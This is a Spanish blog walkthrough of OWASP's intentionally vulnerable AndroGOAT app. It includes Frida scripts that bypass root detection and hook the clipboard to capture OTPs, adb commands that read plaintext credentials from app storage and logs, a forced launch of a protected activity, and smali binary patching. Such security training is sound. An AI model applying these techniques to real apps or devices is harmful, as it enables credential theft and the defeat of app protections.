---
layout: post
title: AndroGOAT Writeup
comments: true
categories: [Mobile, Writeups]
---

En este post estaremos resolviendo algunos niveles de la aplicación Android vulnerable del [OWASP MASTG](https://github.com/OWASP/mastg), AndroGOAT.

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/AndroGOAT.png){:width="300px"}

# Root Detection

El nivel de detección de root nos plantea una interfaz con un botón que al ser pulsado nos reporta si se detectan privilegios de superusuario. El objetivo es saltar esta protección.

## Frida

La opción más común es tratar de hookear la función que actúa como detector y evitar que devuelva `true`. La función es la siguiente (descompilado utilizando *jadx*) dentro de `RootDetectionActivity`:

```java
public final boolean isRooted() {
    String[] file = {"/system/app/Superuser/Superuser.apk", "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su", "re.robv.android.xposed.installer-1.apk", "/data/app/eu.chainfire.supersu-1/base.apk"};
    boolean result = false;
    for (String files : file) {
        File f = new File(files);
        result = f.exists();
        if (result) {
            break;
        }
    }
    return result;
}
```

Para bypasearla es tan sencillo como ejecutar el frida-server en el dispositivo:

```bash
adb push frida-server /data/local/tmp
adb shell
su
cd /data/local/tmp/
./frida-server
```

Y lanzar frida con el siguiente script:

```java
Java.perform(function () {
    var RootDetectionActivity = Java.use("owasp.sat.agoat.RootDetectionActivity");

    RootDetectionActivity.isRooted.implementation = function () {
        console.log("[+] isRooted() called - returning false");
        return false;
    };	
});
```

Así conseguimos que no se nos detecte:

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/GOAT-RootDetection-Solved.png){:width="200px"}

## Magisk

Una forma más sencilla es utilizando [*magisk*](), esta herramienta nos proporciona una *blacklist* para seleccionar una serie de aplicaciones a las que se ocultará el root.

```bash
adb shell
su
magisk --denylist enable                                                                            
magisk --denylist add owasp.sat.agoat 
```

# Insecure Data Storage

## Shared Preferences

En la primera parte se nos ofrece una pantalla para registrar un usuario. SIn embargo, se guarda bajo `SharedPreferences`, por tanto es posible acceder y verlo en texto plano:

```xml
/data/data/owasp.sat.agoat/shared_prefs # cat users.xml                                                                       
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">naibupass</string>
    <string name="username">naibu3</string>
</map>
```

En la segunda parte se nos presenta una puntuación que aumenta al pulsar un botón, sin embargo, también es una preferencia compartida, por tanto podemos modificarla para meter 1000 puntos:

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <int name="score" value="10003" />
    <int name="level" value="2" />
</map>
```

Es importante que modifiquemos el fichero con la app cerrada, ya que las preferencias se cachean.

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/GOAT-InsecureStorage-Solved.png){:width="200px"}

## Sqlite

De igual forma, en la siguiente parte, las credenciales se guardan en una base de datos. Podemos traerla a nuestra máquina con adb y visualizarla con sqlite.

## Tmp File

En este caso se guarda en un archivo temporal creado en la raíz del espacio de nombres de la aplicación.

## SDCard

El último nivel guarda los archivos en un tarjeta SD. En mi caso no tenía así que no funcionaba :V

# Side Channel Data Leakage

En esta parte veremos como podemos encontrar información que pueda quedar expuesta indirectamente.

## Keyboard Cache

```bash
OP56CDL1:/data/data/com.google.android.inputmethod.latin/files/personal/userhistory # strings *
0$>a
We love Marisa.
We love Marisa.
a	rkm
@gmail.com
privadi
dekracstesting
@test.c
```

## Insecure Logging

```bash
adb logcat | grep -i "Error occured when processing"
07-02 13:44:49.625 11105 11105 E Error:  : Error occured when processing Username naivu3   and Password naivu3
07-02 13:44:49.625 11105 11105 I System.out: Error: Error occured when processing Username naivu3   and Password naivu3
07-02 13:44:50.637 11105 11105 E Error:  : Error occured when processing Username naivu3   and Password naivu3
```

## Clipboard

En este caso se nos dan una vista que nos da copia a la clipboard un OTP al ingresar un número de tarjeta. Esto es peligroso ya que el portapapeles es compartido para todo el sistema. Para interceptarlo podemos utilizar por ejemplo frida:

```java
Java.perform(function() {
    var ClipboardManager = Java.use("android.content.ClipboardManager");
    ClipboardManager.setPrimaryClip.implementation = function(clip) {
        console.log("Clipboard set to: " + clip.getItemAt(0).getText());
        return this.setPrimaryClip(clip);
    };
});
```

```bash
frida -U -N owasp.sat.agoat -l cliper.js

     ____
    / _  |   Frida 17.2.6 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to CPH2437 (id=VOQ4JBEM8L69V8MF)
[CPH2437::owasp.sat.agoat ]-> Clipboard set to: 9886
Clipboard set to: 6521
Clipboard set to: 5162
Clipboard set to: 7104
```

# Input Validations

## XSS

Esta sección es vlnerable a XSS:

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/GOAT-XSS-Solved.png){:width="200px"}

## SQLi

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/GOAT-SQLi-Solved.png){:width="200px"}

## WebView

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/GOAT-File-Solved.png){:width="200px"}

# Unprotected Android Components

```xml
OP56CDL1:/data/data/owasp.sat.agoat/shared_prefs # cat pinDetails.xml                                                                  
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="pinSet" value="true" />
    <string name="pin">81dc9bdb52d04dc20036dbd8313ed055</string>
</map>
```

```bash
adb shell am start -n owasp.sat.agoat/.AccessControl1ViewActivity
Starting: Intent { cmp=owasp.sat.agoat/.AccessControl1ViewActivity }
```

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/GOAT-DownloadInvoice.png){:width="200px"}

# Binary Patching

En esta parte queremos acceder a una Funcionalidad de Administración, sin embargo parece estar bloqueada. Para ello lo que haremos será modificar el propio programa para hacerle creer que somos administradores.

Lo primero es extraer los ficheros de la apk:

```bash
apktool d AndroGoat.apk
```

Nos dirijiremos a la carpeta `smali`, donde se guarda el código como instrucciones Dalvik. Allí podemos acceder a la actividad correspondiente y editar la comprobación de los privilegios:

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/AndroGOAT-BinaryPatching.png){:width="200px"}

Una vez modificado podemos recompilar e instalar y *voilá*, tendremos acceso a la supuesta funcionalidad privilegiada:

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/AndroGOAT-BianryPatching-Compile.png){:width="200px"}

<br>
![Image]({{ site.baseurl }}/images/posts/AndroGOAT/GOAT-Patching-Solved.png){:width="200px"}

Y con esto habríamos terminado de vulnerar la aplicación AndroGoat. Sólo quedaría la parte de interceptar tráfico, pero será cubierta en un post futuro.